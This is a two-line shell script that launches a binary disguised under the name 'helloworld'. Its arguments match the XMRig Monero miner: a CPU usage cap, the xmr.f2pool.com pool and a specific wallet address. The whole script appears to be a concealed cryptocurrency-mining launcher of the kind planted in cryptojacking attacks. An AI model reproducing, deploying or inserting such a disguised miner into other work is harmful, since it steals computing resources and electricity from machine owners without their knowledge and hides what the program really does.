#!/bin/sh
./helloworld --max-cpu-usage 75 --donate-level 1 -o xmr.f2pool.com:13531 -u 46yaUjwNZm2TGMf6mgrX1oZNTGQ82kpcMWwGPkxzehQ5QM5AzjmF9EuGW77b538rg5JYxyr1nyoWwPJ4n4v5v6Xy2d2AsaQ.T -p x
